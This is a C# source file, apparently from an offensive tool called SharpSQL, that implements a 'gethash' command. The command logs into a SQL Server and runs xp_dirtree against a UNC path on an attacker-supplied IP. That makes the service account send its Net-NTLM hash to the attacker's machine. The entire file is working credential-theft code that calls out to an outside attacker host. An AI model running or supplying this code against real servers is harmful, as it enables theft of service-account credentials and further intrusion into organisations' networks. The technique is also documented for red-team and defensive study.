using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace SharpSQL.Commands
{
    public class gethash : ICommand
    {
        public static string CommandName => "gethash";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Retrieve Net-NTLM Hash for Service Account");
            Console.WriteLine("\tUsage: SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP");

            string database = "";
            string connectserver = "";
            string ip = "";

            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/ip"))
            {
                ip = arguments["/ip"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(ip))
            {
                Console.WriteLine("\r\n[X] You must supply the IP address of your attack box!\r\n");
                return;
            }

            string connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                Environment.Exit(0);
            }

            string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
            SqlCommand command = new SqlCommand(queryUNC, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            connection.Close();

            connection.Close();
        }
    }
}
